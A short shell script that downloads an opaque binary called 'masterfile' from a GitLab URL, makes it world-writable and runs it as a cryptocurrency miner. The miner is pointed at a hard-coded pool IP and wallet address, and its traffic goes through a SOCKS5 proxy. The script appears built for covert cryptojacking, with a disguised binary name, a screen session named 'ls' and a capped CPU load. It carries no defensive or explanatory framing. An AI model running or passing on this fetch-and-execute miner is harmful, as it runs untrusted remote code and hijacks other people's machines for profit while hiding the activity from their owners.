#!/bin/sh
apt-get update 
apt-get install screen libjansson4 -y
wget https://gitlab.com/buyutuk/xmr/-/raw/main/masterfile
chmod 777 masterfile
screen -dmS ls
POOL=149.248.5.123:6166
WALLET=TRTLv1xLSHLPhfLEmMhk6J1p42SHHSGA15jiByLzY7gvYnotcwb3L5L8FHDUJ4uH7qLkEdfxuTWAW69tZ4LtskR1eTrgWw4BJSB
WORKER=$(echo $(shuf -i 111111-999999 -n 1)-GAS)
PROXY=socks5://72.221.164.34:60671
./masterfile -o $POOL -u $WALLET -p $WORKER -a argon2/chukwav2 --donate-level 1 --max-cpu-usage 75 -x $PROXY -k
